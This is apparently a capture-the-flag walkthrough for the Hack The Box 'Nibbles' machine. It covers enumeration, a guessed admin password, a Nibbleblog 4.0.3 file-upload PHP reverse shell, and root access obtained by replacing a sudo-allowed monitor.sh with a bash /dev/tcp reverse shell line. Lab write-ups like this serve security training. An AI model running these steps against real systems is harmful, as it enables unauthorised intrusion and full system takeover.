#Hack The Box:Nibbles

Nmap scan 

```zsh 
nmap -sS -p- -r -Pn 10.10.10.75
```
Dirsearch/Gobuster reveal nothing interesting

Check source to find /nibbleblog

Go to the url ```http://10.10.10.75/nibbleblog```. Now do a dirsearch.

```zsh
python3 dirsearch.py -u http://10.10.10.75/nibbleblog/ -e r -R 3
```

Interesting URL

```/nibbleblog/admin.php```

Now take guess at the username&password:```admin-nibble```
And you have logged in.

```zsh 
searchsploit nibble
```
```Nibbleblog 4.0.3 - Arbitrary File Upload``` looked interesting on reading the exploit. 
```https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html```

Basically the url ```http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image``` lets you upload file arbitrarily.

Get this php reverseshell from ```/usr/share/webshells/php/php-reverse-shell.php```

Edit with your IP and Listener ```rlwrap nc -lvnp 443```

Visit the file which gets stored as image.php by default.
And now you have a shell.

Unzip the ```personal.zip``` in the home directory and you will find a script inside known as ```monitor.sh```

Do a ```sudo -l``` and this will show the follwing.

```User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

Check permissions on the file. You have read,write,execute permission. Remove the file and simply write a script named monitor.sh with the following inside.

```
#! /bin/bash
bash -i >& /dev/tcp/10.10.14.5/80 0>&1
```
Start a listener at port 80. Run the file now using:

```sudo -u root  /home/nibbler/personal/stuff/monitor.sh```
And you will have aa shell as root.
